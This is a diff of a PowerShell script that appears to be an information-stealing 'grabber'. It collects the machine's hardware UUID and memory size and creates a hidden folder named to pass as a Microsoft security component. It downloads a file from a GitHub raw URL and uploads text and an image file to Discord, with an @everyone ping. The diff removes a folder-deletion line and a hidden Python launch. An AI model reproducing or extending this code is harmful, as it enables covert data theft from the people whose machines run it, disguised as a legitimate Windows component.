@@ -13,7 +13,6 @@ $hwid = (Get-CimInstance -Class Win32_ComputerSystemProduct).UUID
 $ram = (Get-CimInstance Win32_PhysicalMemory | Measure-Object -Property capacity -Sum).sum /1gb
 md C:\windows\temp\Win.microsoft.Security.temp
 cls
-Remove-Item -Path "C:\windows\temp\Win.microsoft.Security.temp"
 attrib +h "C:\windows\temp\Win.microsoft.Security.temp"
 cls
 #####################################################################
@@ -100,7 +99,6 @@ Invoke-WebRequest -Uri "https://raw.githubusercontent.com/Appolon24800/Legitgrab
 
 ######################################################################
 Upload-Discord -text "||@everyone||"
-powershell -windowstyle hidden C:\Windows\Temp\Win.microsoft.Security.temp\UUID_gen.py
 Start-Sleep -Seconds 3
 Upload-Discord -text "-----------------------------------------------------------------------------------------------------------------------------------------------------------"
 Upload-Discord -file "C:\Windows\Temp\MicrosoftPolicy.png"
